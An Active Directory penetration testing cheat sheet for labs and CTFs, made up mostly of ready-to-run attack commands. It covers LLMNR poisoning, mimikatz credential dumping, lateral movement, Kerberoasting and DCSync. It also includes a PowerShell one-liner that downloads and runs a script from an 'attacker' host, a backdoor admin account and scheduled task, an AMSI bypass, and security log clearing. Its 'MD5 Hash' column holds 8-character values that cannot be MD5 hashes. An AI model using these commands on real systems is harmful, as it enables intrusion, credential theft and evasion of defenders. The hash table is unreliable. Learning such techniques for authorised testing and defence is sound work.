# Active Directory Penetration Testing - Basics

> Ethical Hacking | Red Team | CTF | SOC Labs | Blue Team Awareness | Offensive Security
<div class="ad-module">

## 🧭  Objectives

This guide takes you through a full course on attacking Active Directory (AD) environments, suitable for red team operations, CTF competitions, and SOC training. You'll cover:

- AD core concepts
- Recon and enumeration
- Gaining and abusing credentials
- Movement and escalation
- Attacking Kerberos, trusts, and related systems
- Post-exploitation, evasion, and cleanup
</div>

<div class="ad-module">

## 🧱 Module 1: Active Directory Basics

**Definition:** Active Directory (AD) is Microsoft’s centralized domain management system that authenticates and authorizes users and computers.

**Core Components:**

- **Domain Controllers (DCs):** Store the AD database and handle authentication
- **Domains, Forests, Trees:** Logical structures for organizing resources
- **Organizational Units (OUs):** Containers for grouping users, computers
- **Group Policy Objects (GPOs):** Define rules and security settings

**Protocols & Services:**

- **Kerberos & NTLM** for authentication
- **LDAP** for querying the directory
- **DNS, SMB, RPC** for communication

</div>

<div class="ad-module">

## 🛰️ Module 2: Reconnaissance Phase

**Goal:** Map the network and identify live hosts/services.

**Tools:** netdiscover, nmap, nbtscan, masscan

```bash
netdiscover -i eth0
nmap -sP 192.168.1.0/24
masscan 192.168.1.0/24 -p1-65535 --rate=10000
nbtscan 192.168.1.0/24
```

</div>

<div class="ad-module">

## 🔍 Module 3: Enumeration Phase

**Goal:** Discover domain details—users, shares, GPOs, etc.

**Tools:** enum4linux, smbclient, ldapsearch, rpcclient, BloodHound, ADExplorer

```bash
enum4linux -a 192.168.1.100
smbclient -L \\192.168.1.100 -N
ldapsearch -x -H ldap://192.168.1.100 -b "dc=domain,dc=local"
```

</div>

<div class="ad-module">

## 🚪 Module 4: Initial Access

**Goal:** Obtain a foothold using weak auth or misconfig.

**Techniques:** AS-REP Roasting, NTLM Relay, LLMNR Poisoning

```bash
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.100
responder -I eth0
mitm6 -i eth0

```

</div>

<div class="ad-module">

## 🔐 Module 5: Credential Access

**Goal:** Extract passwords, hashes, and tickets.

**Tools:** mimikatz, secretsdump, pypykatz

```bash
mimikatz > sekurlsa::logonpasswords
secretsdump.py domain/user:pass@192.168.1.100

```

</div>

<div class="ad-module">

## 📡 Module 6: Lateral Movement

**Goal:** Move to other systems after initial access.

**Tools:** wmiexec, psexec, crackmapexec

```bash
wmiexec.py domain/user:pass@192.168.1.101
psexec.py domain/user:pass@192.168.1.101

```

</div>

<div class="ad-module">

## 📈 Module 7: Privilege Escalation

**Goal:** Escalate local user to SYSTEM or Domain Admin.

**Tools:** winPEAS, PowerUp, Seatbelt

```bash
winPEAS.exe
powershell -ep bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1'); Invoke-AllChecks"

```

</div>

<div class="ad-module">

## 🧲 Module 8: Persistence Techniques

**Goal:** Maintain long-term access.

```powershell
net user attacker P@ssw0rd /add
net localgroup administrators attacker /add
schtasks /create /tn "Backdoor" /tr "cmd.exe /c whoami >> C:\backdoor.txt" /sc minute /mo 5

```

</div>

<div class="ad-module">

## 🎭 Module 9: Kerberos Attacks

**Goal:** Abuse ticketing mechanisms.

**Tools:** Rubeus, GetUserSPNs, hashcat

```bash
GetUserSPNs.py domain/user:pass -dc-ip 192.168.1.100
hashcat -m 13100 hashes.txt rockyou.txt --force

```

</div>

<div class="ad-module">

## 🏛️ Module 10: Domain Escalation

**Goal:** Gain Domain Admin or take over trusts.

```bash
lsadump::dcsync /domain:domain.local /user:Administrator
Invoke-ACLScanner
Invoke-AddComputer

```

</div>

<div class="ad-module">

## 🧾 Module 11: Post-Exploitation

**Goal:** Data collection, pivoting, intel gathering.

```bash
findstr /S /I cpassword \\dc\sysvol
LaZagne.exe browsers

```

</div>

<div class="ad-module">

## 🕵️ Module 12: Defense Evasion

**Goal:** Avoid detection during attacks.

```powershell
Clear-EventLog -LogName Security
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

```

</div>

<div class="ad-module">

## 🧹 Module 13: Cleanup

**Goal:** Remove traces post-assessment.

```powershell
net user attacker /del
schtasks /delete /tn "Backdoor"
Clear-EventLog -LogName System

```

</div>

<div class="ad-module">

## 🖧 Module 14: Connected System Attacks

**Exchange:**

```powershell
Invoke-SelfSearch -Mailbox user@domain.local -SearchQuery 'password'

```

**SCCM:** Abuse deployment paths or extract config.

**ADFS:** Golden SAML, token forging

</div>

## 🧪 Tools & References

| Tool | Use | MD5 Hash |
| --- | --- | --- |
| Mimikatz | Dump credentials | b72868aa |
| BloodHound | AD relationship mapping | 358a13fe |
| Impacket | Remote command & Kerberos | 8102db6b |
| CrackMapExec | Lateral movement and enum | 118802fb |
| Responder | LLMNR spoof | 34bdf2dc |
| PEASS-ng | Privesc check | a1074bbf |
| PowerSploit | PowerShell recon/privesc | 473d90f6 |

## ✅ You're Ready!

Use this cheat sheet to practice on your lab and in CTFs. Let me know if you want video walkthroughs or scripts for automation.

